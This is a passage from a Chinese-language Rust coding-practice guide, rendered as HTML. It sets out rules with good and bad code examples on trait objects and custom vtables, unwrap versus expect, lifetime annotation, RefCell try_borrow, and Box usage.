    type Target = Foo;

    fn deref(&amp;self) -&gt; &amp;Foo {
        &amp;self.f
    }
}

fn main() {
    let bar = Bar { f: Foo {} };
    bar.m();
}

</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="trait-对象"><a class="header" href="#trait-对象">trait 对象</a></h1>
<p>trait 对象需要注意 动态安全 （dyn safe），也叫对象安全 （object safe），但官方现在倾向于 动态安全这个术语。</p>
<h2 id="列表-1"><a class="header" href="#列表-1">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/traits/./trait-object/P.TRA.OBJ.01.html">P.TRA.OBJ.01 根据场景合理选择使用trait对象或泛型静态分发</a></li>
<li><a href="safe-guides/coding_practice/traits/./trait-object/P.TRA.OBJ.02.html">P.TRA.OBJ.02 除非必要，避免自定义虚表</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptraobj01--根据场景合理选择使用trait对象或泛型静态分发"><a class="header" href="#ptraobj01--根据场景合理选择使用trait对象或泛型静态分发">P.TRA.OBJ.01  根据场景合理选择使用trait对象或泛型静态分发</a></h2>
<p><strong>【描述】</strong></p>
<p>trait对象存在一定运行时开销，除非必要，不要滥用，但triat对象也可以避免编译文件大小膨胀。</p>
<p>在性能有严格要求的情况下，可以考虑<code>Enum</code>或泛型静态分发代替。</p>
<p><strong>【正例】</strong></p>
<p>使用 Enum 代替 trait 对象。 示例来自于 <a href="https://docs.rs/enum_dispatch/0.3.7/enum_dispatch/">enum_dispatch</a></p>
<pre><pre class="playground"><code class="language-rust">trait KnobControl {
    fn set_position(&amp;mut self, value: f64);
    fn get_value(&amp;self) -&gt; f64;
}

struct LinearKnob {
    position: f64,
}

struct LogarithmicKnob {
    position: f64,
}

impl KnobControl for LinearKnob {
    fn set_position(&amp;mut self, value: f64) {
        self.position = value;
    }

    fn get_value(&amp;self) -&gt; f64 {
        self.position
    }
}

impl KnobControl for LogarithmicKnob {
    fn set_position(&amp;mut self, value: f64) {
        self.position = value;
    }

    fn get_value(&amp;self) -&gt; f64 {
        (self.position + 1.).log2()
    }
}

fn main() {
    // 这里使用 trait 对象
    let v: Vec&lt;Box&lt;dyn KnobControl&gt;&gt; = vec![
        //set the knobs
    ];

    //use the knobs
}
</code></pre></pre>
<p>用 Enum 代替：</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>enum Knob {
    Linear(LinearKnob),
    Logarithmic(LogarithmicKnob),
}

impl KnobControl for Knob {
    fn set_position(&amp;mut self, value: f64) {
        match self {
            Knob::Linear(inner_knob) =&gt; inner_knob.set_position(value),
            Knob::Logarithmic(inner_knob) =&gt; inner_knob.set_position(value),
        }
    }

    fn get_value(&amp;self) -&gt; f64 {
        match self {
            Knob::Linear(inner_knob) =&gt; inner_knob.get_value(),
            Knob::Logarithmic(inner_knob) =&gt; inner_knob.get_value(),
        }
    }
}
<span class="boring">}
</span></code></pre></pre>
<p>性能有显著提高，但是牺牲了维护成本。可以借助于宏来自动生成相关代码，参见： <a href="https://docs.rs/enum_dispatch/0.3.7/enum_dispatch/">enum_dispatch</a></p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="ptraobj02--除非必要避免自定义虚表"><a class="header" href="#ptraobj02--除非必要避免自定义虚表">P.TRA.OBJ.02  除非必要，避免自定义虚表</a></h2>
<p><strong>【描述】</strong></p>
<p>trait 对象 <code>dyn Trait</code> 隐藏了复杂而又为危险的虚表实现，为我们提供了简单而又安全的动态分发。手动实现虚表的代码中充斥着大量的 <code>unsafe</code>，稍有不慎，就会引入 bug 。如无必要，不要自定义虚表。</p>
<p>如果你的设计不能使用标准的 <code>dyn Trait</code> 结构来表达，那么你首先应该尝试重构你的程序，并参考以下理由来决定是否使用自定义的虚表。</p>
<ul>
<li>你想要为一类指针对象实现多态，并且无法忍受多级指针解引用造成的性能开销，参考 <a href="https://doc.rust-lang.org/std/task/struct.RawWaker.html">RawWaker</a> 与 <a href="https://docs.rs/bytes/1.1.0/bytes/struct.Bytes.html">Bytes</a>。</li>
<li>你想要自定义内存布局，比如像 C++ 中虚表一样紧凑的内存结构（虚表指针位于对象内），参考 <a href="https://github.com/tokio-rs/tokio/blob/master/tokio/src/runtime/task/raw.rs#L12">RawTask</a>。</li>
<li>你的 crate 需要在 <code>no_std</code> 环境中使用动态分发，参考 <a href="https://doc.rust-lang.org/std/task/struct.RawWaker.html">RawWaker</a>  。</li>
<li>或者，标准的 trait object 确实无法实现你的需求。</li>
</ul>
<p><strong>【正例】</strong></p>
<p>来自标准库中 <a href="https://doc.rust-lang.org/std/task/struct.RawWaker.html">RawWaker</a> 的定义。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>
<span class="boring">fn main() {
</span>pub struct RawWaker {
    /// A data pointer, which can be used to store arbitrary data as required
    /// by the executor. This could be e.g. a type-erased pointer to an `Arc`
    /// that is associated with the task.
    /// The value of this field gets passed to all functions that are part of
    /// the vtable as the first parameter.
    data: *const (),
    /// Virtual function pointer table that customizes the behavior of this waker.
    vtable: &amp;'static RawWakerVTable,
}
#[derive(PartialEq, Copy, Clone, Debug)]
pub struct RawWakerVTable {
    /// This function will be called when the [`RawWaker`] gets cloned, e.g. when
    /// the [`Waker`] in which the [`RawWaker`] is stored gets cloned.
    ///
    /// The implementation of this function must retain all resources that are
    /// required for this additional instance of a [`RawWaker`] and associated
    /// task. Calling `wake` on the resulting [`RawWaker`] should result in a wakeup
    /// of the same task that would have been awoken by the original [`RawWaker`].
    clone: unsafe fn(*const ()) -&gt; RawWaker,

    /// This function will be called when `wake` is called on the [`Waker`].
    /// It must wake up the task associated with this [`RawWaker`].
    ///
    /// The implementation of this function must make sure to release any
    /// resources that are associated with this instance of a [`RawWaker`] and
    /// associated task.
    wake: unsafe fn(*const ()),

    /// This function will be called when `wake_by_ref` is called on the [`Waker`].
    /// It must wake up the task associated with this [`RawWaker`].
    ///
    /// This function is similar to `wake`, but must not consume the provided data
    /// pointer.
    wake_by_ref: unsafe fn(*const ()),

    /// This function gets called when a [`RawWaker`] gets dropped.
    ///
    /// The implementation of this function must make sure to release any
    /// resources that are associated with this instance of a [`RawWaker`] and
    /// associated task.
    drop: unsafe fn(*const ()),
}
<span class="boring">}
</span></code></pre></pre>
<p>来自 <a href="https://docs.rs/bytes/1.1.0/bytes/struct.Bytes.html">Bytes</a> 的示例。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>pub struct Bytes {
    ptr: *const u8,
    len: usize,
    // inlined &quot;trait object&quot;
    data: AtomicPtr&lt;()&gt;,
    vtable: &amp;'static Vtable,
}

pub(crate) struct Vtable {
    /// fn(data, ptr, len)
    pub clone: unsafe fn(&amp;AtomicPtr&lt;()&gt;, *const u8, usize) -&gt; Bytes,
    /// fn(data, ptr, len)
    pub drop: unsafe fn(&amp;mut AtomicPtr&lt;()&gt;, *const u8, usize),
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="312-错误处理"><a class="header" href="#312-错误处理">3.12 错误处理</a></h1>
<p>Rust 为了保证系统健壮性，将系统中出现的非正常情况划分为三大类：</p>
<ol>
<li>失败</li>
<li>错误</li>
<li>异常</li>
</ol>
<p>Rust 语言针对这三类非正常情况分别提供了专门的处理方式，让开发者可以分情况去选择。</p>
<ul>
<li>对于失败的情况，可以使用断言工具。</li>
<li>对于错误，Rust 提供了基于返回值的分层错误处理方式，比如 Option 可以用来处理可能存在空值的情况，而 Result 就专门用来处理可以被合理解决并需要传播的错误。</li>
<li>对于异常，Rust 将其看作无法被合理解决的问题，提供了线程恐慌机制，在发生异常的时候，线程可以安全地退出。</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="perr01---当传入函数的参数值因为超出某种限制可能会导致函数调用失败应该使用断言"><a class="header" href="#perr01---当传入函数的参数值因为超出某种限制可能会导致函数调用失败应该使用断言">P.ERR.01   当传入函数的参数值因为超出某种限制可能会导致函数调用失败，应该使用断言</a></h2>
<p><strong>【描述】</strong></p>
<p>当传入函数的某个参数值可能因为超出某种限制，比如超出数组长度的索引、字符串是否包含某个字符、数组是否为空等，应该使用断言。</p>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// From: std::vec::Vec::swap_remove
#[stable(feature = &quot;rust1&quot;, since = &quot;1.0.0&quot;)]
pub fn swap_remove(&amp;mut self, index: usize) -&gt; T {
    #[cold]
    #[inline(never)]
    fn assert_failed(index: usize, len: usize) -&gt; ! {
        panic!(&quot;swap_remove index (is {}) should be &lt; len (is {})&quot;, index, len);
    }

    let len = self.len();
   
    if index &gt;= len {
        // 此处使用断言方法，虽然不是标准库内置断言宏，但也是一种断言
        assert_failed(index, len);
    }
    unsafe {
        let last = ptr::read(self.as_ptr().add(len - 1));
        let hole = self.as_mut_ptr().add(index);
        self.set_len(len - 1);
        ptr::replace(hole, last)
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="perr02--在确定--optiont-和-resultt-e类型的值不可能是-none-或-err-时请用---expect-代替--unwrap"><a class="header" href="#perr02--在确定--optiont-和-resultt-e类型的值不可能是-none-或-err-时请用---expect-代替--unwrap">P.ERR.02  在确定  <code>Option&lt;T&gt;</code> 和 <code>Result&lt;T, E&gt;</code>类型的值不可能是 <code>None</code> 或 <code>Err</code> 时，请用   <code>expect</code> 代替  <code>unwrap()</code></a></h2>
<p><strong>【描述】</strong></p>
<p>当需要处理的   <code>Option&lt;T&gt;</code> 和 <code>Result&lt;T, E&gt;</code> 类型的值，永远都不可能是 <code>None</code> 或 <code>Err</code> 时，虽然直接 <code>unwrap()</code> 也是可以的，但使用 <code>expect</code> 会有更加明确的语义。</p>
<blockquote>
<p><code>expect</code> 的语义： </p>
<p>我不打算处理 <code>None</code> 或 <code>Err</code> 这种可能性，因为我知道这种可能性永远不会发生，或者，它不应该发生。但是 类型系统并不知道它永远不会发生。所以，我需要像类型系统保证，如果它确实发生了，它可以认为是一种错误，并且程序应该崩溃，并带着可以用于跟踪和修复该错误的栈跟踪信息。</p>
</blockquote>
<p>所以在指定 <code>expect</code> 输出消息的时候，请使用肯定的描述，而非否定，用于提升可读性。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 这个配置文件默认会跟随源码出现，所以，必定可以读取到
// 这个配置文件不应该没有被提供，如果万一出现了没有提供的情况，需要 Panic ，但这里并没有提供错误信息，对于调试或使用都没有帮助
let config = Config::read(&quot;some_config.toml&quot;).unwrap();

// or
// expect 的输出描述使用否定式内容，可读性不好
let config = Config::read(&quot;some_config.toml&quot;).expect(&quot;No configuration file provided&quot;); 

// or

fn main() {
    use std::net::IpAddr;
    let _home: IpAddr = &quot;127.0.0.1&quot;.parse().unwrap();
}

// or
// expect 的输出描述使用否定式内容，可读性不好
fn main() {
    use std::net::IpAddr;
    let _home: IpAddr = &quot;127.0.0.1&quot;.parse().expect(&quot;IP addr parse failed!&quot;);
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">// 这个配置文件默认会跟随源码出现，所以，必定可以读取到
// 这个配置文件不应该没有被提供，如果万一出现了没有提供的情况，需要 Panic 并提供错误信息方便调试，或者让使用者知道原因
// expect 里输出的描述信息，使用肯定的内容，整体代码可读性更高，更能突出 expect 的语义
let config = Config::read(&quot;some_config.toml&quot;).expect(&quot;Provide the correct configuration file&quot;); 

// or

fn main() {
    use std::net::IpAddr;
    let _home: IpAddr = &quot;127.0.0.1&quot;.parse().expect(&quot;Provide the correct Ip addr&quot;);
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gerr01--在处理-optiont-和-resultt-e-类型时不要随便使用-unwrap"><a class="header" href="#gerr01--在处理-optiont-和-resultt-e-类型时不要随便使用-unwrap">G.ERR.01  在处理 <code>Option&lt;T&gt;</code> 和 <code>Result&lt;T, E&gt;</code> 类型时，不要随便使用 <code>unwrap</code></a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>当 <code>Option&lt;T&gt;</code> 和 <code>Result&lt;T, E&gt;</code>类型的值分别是 <code>None</code> 或 <code>Err</code> 时，直接对其 <code>unwrap()</code> 会导致程序恐慌！</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::unwrap_used)]

<span class="boring">fn main() {
</span>fn select(opt: Option&lt;String&gt;) {
    opt.unwrap();  // 不符合
}
// OR
fn select(opt: Result&lt;String, ()&gt;) {
    res.unwrap();  // 不符合
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![warn(clippy::unwrap_used)]

<span class="boring">fn main() {
</span>fn select(opt: Option&lt;String&gt;) {
    opt.expect(&quot;more helpful message&quot;);  // 符合：可以用 expect 方法来处理 None 的情况
}
// OR
fn select(opt: Result&lt;String, ()&gt;) {
    res.expect(&quot;more helpful message&quot;);  // 符合：可以用 expect 方法来处理 Err 的情况
}
<span class="boring">}
</span></code></pre></pre>
<h3 id="lint-检测-1"><a class="header" href="#lint-检测-1">【Lint 检测】</a></h3>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#unwrap_used">unwrap_used</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gerr02----不要滥用-expect请考虑用-unwrap_or_-系列方法代替"><a class="header" href="#gerr02----不要滥用-expect请考虑用-unwrap_or_-系列方法代替">G.ERR.02    不要滥用 <code>expect</code>，请考虑用 <code>unwrap_or_</code> 系列方法代替</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>使用 <code>expect</code> 的时候请遵循 <code>expect</code> 的语义，不要滥用。</p>
<blockquote>
<p><code>expect</code> 的语义： </p>
<p>我不打算处理 <code>None</code> 或 <code>Err</code> 这种可能性，因为我知道这种可能性永远不会发生，或者，它不应该发生。但是 类型系统并不知道它永远不会发生。所以，我需要像类型系统保证，如果它确实发生了，它可以认为是一种错误，并且程序应该崩溃，并带着可以用于跟踪和修复该错误的栈跟踪信息。</p>
</blockquote>
<p>但是对于一些存在“副作用”的函数，在 遇到 <code>None</code> 或 <code>Err</code> 时，可能需要返回一些指定的值。这个时候用 <code>expect</code> 就不太符合语义。</p>
<p>如果你的用法完全符合 <code>expect</code> 语义，那么可以设置 <code>#![allow(clippy::expect_fun_call]</code></p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::expect_used)]
fn main(){
    let foo = Some(String::new());
    let err_code = &quot;418&quot;;
    let err_msg = &quot;I'm a teapot&quot;;
    // 不符合：因为要返回指定的错误码等信息，不适合 expect 语义
    foo.expect(&amp;format!(&quot;Err {}: {}&quot;, err_code, err_msg)); 
}

</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">#![warn(clippy::expect_used)]
fn main(){
    let foo = Some(String::new());
    let err_code = &quot;418&quot;;
    let err_msg = &quot;I'm a teapot&quot;;
    // 符合
    foo.unwrap_or_else(|| panic!(&quot;Err {}: {}&quot;, err_code, err_msg));  // 你可以根据场景选择性使用 panic! 或者 不 panic!
}
</code></pre></pre>
<p><strong>【例外】</strong></p>
<p>完全符合 <code>expect</code> 语义的使用。</p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span>#![allow(clippy::expect_fun_call]

<span class="boring">fn main() {
</span>// 这个配置文件默认会跟随源码出现，所以，必定可以读取到
// 这个配置文件不应该没有被提供，如果万一出现了没有提供的情况，需要 Panic 并提供错误信息方便调试，或者让使用者知道原因
let config = Config::read(&quot;some_config.toml&quot;).expect(&quot;Provide the correct configuration file&quot;); 


// 或者

use std::net::IpAddr;
let _home: IpAddr = &quot;127.0.0.1&quot;.parse().expect(&quot;Provide the correct Ip addr&quot;);

<span class="boring">}
</span></code></pre></pre>
<h3 id="lint-检测-2"><a class="header" href="#lint-检测-2">【Lint 检测】</a></h3>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#expect_fun_call">expect_fun_call</a></td><td>yes</td><td>no</td><td>perf</td><td>warn</td></tr>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#expect_used">expect_used</a></td><td>yes</td><td>no</td><td>restriction</td><td>allow</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h1 id="313-内存管理"><a class="header" href="#313-内存管理">3.13 内存管理</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="生命周期"><a class="header" href="#生命周期">生命周期</a></h1>
<p>生命周期（lifetime），也被叫做 生存期。可以理解为引用的有效范围。</p>
<h2 id="列表-2"><a class="header" href="#列表-2">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/memory/./lifetime/P.MEM.LFT.01.html">P.MEM.LFT.01 生命周期参数命名尽量有意义且简洁</a></li>
<li><a href="safe-guides/coding_practice/memory/./lifetime/P.MEM.LFT.02.html">P.MEM.LFT.02 通常需要显式地标注生命周期，而非利用编译器推断</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmemlft01-生命周期参数命名尽量有意义且简洁"><a class="header" href="#pmemlft01-生命周期参数命名尽量有意义且简洁">P.MEM.LFT.01 生命周期参数命名尽量有意义且简洁</a></h2>
<p><strong>【描述】</strong></p>
<p>生命周期参数的命名应该尽量简单，可以使用表达一定语义的缩写。</p>
<p>因为生命周期参数的目的是给编译器使用，用于防止函数中出现悬垂引用。</p>
<p>适当简单的携带语义的缩写，可以最小化对业务代码的干扰。并且在生命周期参数较多的情况下，清晰地表达具体哪个引用属于哪个生命周期。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct ConstraintGeneration&lt;'a, 'b, 'c&gt; {
    infcx: &amp;'c InferCtxt&lt;'b, 'c&gt;,
    all_facts: &amp;'a mut Option&lt;AllFacts&gt;,
    location_table: &amp;'a LocationTable,
    liveness_constraints: &amp;'a mut LivenessValues&lt;RegionVid&gt;,
    borrow_set: &amp;'a BorrowSet&lt;'c&gt;,
    body: &amp;'c Body&lt;'c&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 增加 'cg 意义的文档注释
/// 'cg = the duration of the constraint generation process itself.
struct ConstraintGeneration&lt;'cg, 'cx, 'tcx&gt; {
    infcx: &amp;'cg InferCtxt&lt;'cx, 'tcx&gt;,
    all_facts: &amp;'cg mut Option&lt;AllFacts&gt;,
    location_table: &amp;'cg LocationTable,
    liveness_constraints: &amp;'cg mut LivenessValues&lt;RegionVid&gt;,
    borrow_set: &amp;'cg BorrowSet&lt;'tcx&gt;,
    body: &amp;'cg Body&lt;'tcx&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmemlifetime02-通常需要显式地标注生命周期而非利用编译器推断"><a class="header" href="#pmemlifetime02-通常需要显式地标注生命周期而非利用编译器推断">P.MEM.Lifetime.02 通常需要显式地标注生命周期，而非利用编译器推断</a></h2>
<p><strong>【描述】</strong></p>
<p>编译器对生命周期参数有两种单态化方式（生命周期参数也是一种泛型）：</p>
<ul>
<li>Early bound。一般情况下，<code>'a: 'b</code> 以及 <code>impl&lt;'a&gt;</code> 这种方式是 early bound，意味着这些生命周期参数会在当前作用域单态化生命周期实例。</li>
<li>Late bound。默认的 <code>'a</code> 或 <code>for&lt;'a&gt;</code> 是在实际调用它们的地方才单态化生命周期实例。</li>
</ul>
<p>在不同的场景下需要指定合适的单态化方式，才能让编译器明白开发者的意图。</p>
<p>在使用匿名生命周期 <code>'_</code> 的时候需要注意，如果有多个匿名生命周期，比如 <code>('_，'_)</code> ，每个匿名生命周期都会有自己的单独实例。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let v = vec![1, 2, 3, 4, 5, 6];
    let mut buf = Buffer::new(&amp;v);
    // error[E0499]: cannot borrow `buf` as mutable more than once at a time
    let b1 = buf.read_bytes();
    let b2 = buf.read_bytes();
    println!(&quot;{:#?} {:#?}&quot;, b1, b2);
}

struct Buffer&lt;'a&gt; {
    buf: &amp;'a [u8],
    pos: usize,
}

impl&lt;'a&gt; Buffer&lt;'a&gt; {
    fn new(b: &amp;'_ [u8]) -&gt; Buffer {
        Buffer { buf: b, pos: 0 }
    }
    // 不符合：此处依赖编译器推断的生命周期将导致main函数中该方法调用编译错误
    fn read_bytes(&amp;'_ mut self) -&gt; &amp;'_ [u8] {
        self.pos += 3;
        &amp;self.buf[self.pos - 3..self.pos]
    }
}
</code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">fn main() {
    let v = vec![1, 2, 3, 4, 5, 6];
    let mut buf = Buffer::new(&amp;v);
    let b1 = buf.read_bytes();
    let b2 = buf.read_bytes();
    println!(&quot;{:#?} {:#?}&quot;, b1, b2);
}

struct Buffer&lt;'a&gt; {
    buf: &amp;'a [u8],
    pos: usize,
}

// 符合：明确标示清楚生命周期，向编译器传达开发者意图，则可正常编译
impl&lt;'b, 'a: 'b&gt; Buffer&lt;'a&gt; {
    fn new(b: &amp;'_ [u8]) -&gt; Buffer {
        Buffer { buf: b, pos: 0 }
    }
    // 符合：明确标示清楚输入引用和输出引用的生命周期关系是 `'a: 'b`
    fn read_bytes(&amp;'b mut self) -&gt; &amp;'a [u8] {
        self.pos += 3;
        &amp;self.buf[self.pos - 3..self.pos]
    }
}
</code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="智能指针"><a class="header" href="#智能指针">智能指针</a></h1>
<p>智能指针，在 Rust 中参与自动管理堆内容、引用计数、抽象指针语义等功能。一般实现了 <code>Deref</code> trait 或 <code>Drop</code> trait 的类型都可以看作是一种智能指针。</p>
<p><code>Box&lt;T&gt;</code> 就是一个典型的智能指针，但是因为其在 Rust 中有特殊地位，所以为其单独罗列规则。</p>
<p>Rust 中常见的智能指针包括：</p>
<ul>
<li>自动管理堆内存：<code>Box&lt;T&gt;</code></li>
<li>引用计数：<code>Rc&lt;T&gt; / Arc&lt;T&gt;</code></li>
<li>内部可变性容器：<code>Cell&lt;T&gt; / RefCell&lt;T&gt;</code></li>
</ul>
<h2 id="列表-3"><a class="header" href="#列表-3">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/memory/./smart-ptr/P.MEM.SPT.01.html">P.MEM.SPT.01 使用 <code>RefCell&lt;T&gt;</code> 时宜使用 <code>try_borrow/try_borrow_mut</code> 方法</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="pmemspt01-使用-refcellt-时宜使用-try_borrowtry_borrow_mut-方法"><a class="header" href="#pmemspt01-使用-refcellt-时宜使用-try_borrowtry_borrow_mut-方法">P.MEM.SPT.01 使用 <code>RefCell&lt;T&gt;</code> 时宜使用 <code>try_borrow/try_borrow_mut</code> 方法</a></h2>
<p><strong>【描述】</strong></p>
<p>Rust 的 <code>RefCell&lt;T&gt;</code> 在运行时会对通过 <code>borrow/borrow_mut</code> 方法借用出去的不可变借用和可变借用进行检查。如果发现违反了借用规则的情况，则会 Panic。</p>
<p>所以在一些多线程场景下，开发者可能对细粒度的操作加了锁同步，但是没有对 <code>RefCell&lt;T&gt;</code> 进行加锁，此时宜用 <code>try_borrow/try_borrow_mut</code> 来代替
<code>borrow/borrow_mut</code>，以避免在运行时因为违反借用检查规则而出现 Panic。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
// 以下两个函数会让 C 函数在多线程下调用
// 运行过程中有一定几率会出现 Panic
pub extern &quot;C&quot; fn nic_udrv_suspend() {
    NIC_ENTITY.borrow_mut().suspend(); // suspend()需要可变引用
}

pub extern &quot;C&quot; fn nic_udrv_buf_recycle(buf_id: usize) {
    NIC_ENTITY.borrow().buf_recycle(buf_id); // buf_recycle()内有锁可以避免多线程竞争
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
// 以下两个函数会让 C 函数在多线程下调用
// 使用 try_borrow 或 try_borrow_mut 可以避免运行过程中出现 Panic
pub extern &quot;C&quot; fn nic_udrv_suspend() {
    if let Ok(entity) = NIC_ENTITY.try_borrow_mut() {
        entity.suspend(); // suspend()需要可变引用
    }
}

pub extern &quot;C&quot; fn nic_udrv_buf_recycle(buf_id: usize) {
    if let Ok(entity) = NIC_ENTITY.try_borrow() {
        entity.buf_recycle(buf_id); // buf_recycle()内有锁可以避免多线程竞争
    }
}
<span class="boring">}
</span></code></pre></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="box-类型"><a class="header" href="#box-类型">Box 类型</a></h1>
<p>Rust 中分配堆内存必须要使用的类型，类型签名为 <code>Box&lt;T&gt;</code>。</p>
<h2 id="列表-4"><a class="header" href="#列表-4">列表</a></h2>
<ul>
<li><a href="safe-guides/coding_practice/memory/./box/G.MEM.BOX.01.html">G.MEM.BOX.01 一般情况下，不应直接对 <code>Box&lt;T&gt;</code> 进行借用</a></li>
<li><a href="safe-guides/coding_practice/memory/./box/G.MEM.BOX.02.html">G.MEM.BOX.02 一般情况下，不应直接对已经在堆上分配内存的类型进行 Box 装箱</a></li>
<li><a href="safe-guides/coding_practice/memory/./box/G.MEM.BOX.03.html">G.MEM.BOX.03 一般情况下，不应直接对栈分配类型进行 Box 装箱</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmembox01--一般情况下不应直接对-boxt-进行借用"><a class="header" href="#gmembox01--一般情况下不应直接对-boxt-进行借用">G.MEM.BOX.01  一般情况下，不应直接对 <code>Box&lt;T&gt;</code> 进行借用</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>借用 <code>Box&lt;T&gt;</code> 等同于直接借用 <code>T</code>，而 <code>&amp;T</code> 要比 <code>&amp;Box&lt;T&gt;</code> 更常用。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 不符合
fn foo(bar: &amp;Box&lt;T&gt;) { ... }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>// 符合
fn foo(bar: &amp;T) { ... }
<span class="boring">}
</span></code></pre></pre>
<p><strong>【Lint 检测】</strong></p>
<table><thead><tr><th>lint name</th><th>Clippy 可检测</th><th>Rustc 可检测</th><th>Lint Group</th><th>level</th></tr></thead><tbody>
<tr><td><a href="https://rust-lang.github.io/rust-clippy/master/#borrowed_box">borrowed_box</a></td><td>yes</td><td>no</td><td>complexity</td><td>warn</td></tr>
</tbody></table>
<div style="break-before: page; page-break-before: always;"></div><h2 id="gmembox02--一般情况下不应直接对已经在堆上分配内存的类型进行-box-装箱"><a class="header" href="#gmembox02--一般情况下不应直接对已经在堆上分配内存的类型进行-box-装箱">G.MEM.BOX.02  一般情况下，不应直接对已经在堆上分配内存的类型进行 <code>Box</code> 装箱</a></h2>
<p><strong>【级别】</strong> 建议</p>
<p><strong>【描述】</strong></p>
<p>像 <code>Vec&lt;T&gt; / String</code> 这样的类型（数据集）已经在堆上分配了内存，就没有必要再使用 <code>Box</code> 对其进行装箱操作。当然也存在例外情况。</p>
<p><strong>【反例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct X {
    // 不符合：Vec已在堆上分配了内存
    values: Box&lt;Vec&lt;Foo&gt;&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【正例】</strong></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>struct X {
    // 符合
    values: Vec&lt;Foo&gt;,
}
<span class="boring">}
</span></code></pre></pre>
<p><strong>【例外】</strong></p>
<p>用例来源：<a href="https://github.com/rocurley/jex/blob/31e51ff77ea4f7f3c6eaa4aaca2e439985e1241d/src/jq/query.rs#L22">jex</a></p>
<pre><pre class="playground"><code class="language-rust">
<span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>#[derive(Debug)]
pub struct JQ {
    ptr: *mut jq_state,
    // We want to make sure the vec pointer doesn't move, so we can keep pushing to it.
    // 这里不想把 Vec 的指针 Move 掉，所以用 Box 装箱可以达到这个效果
    // 注：clippy::box_vec 以更名为 clippy::box_collection
    #[allow(clippy::box_vec)]
    errors: Box&lt;Vec&lt;JVRaw&gt;&gt;,
}
<span class="boring">}
</span></code></pre></pre>
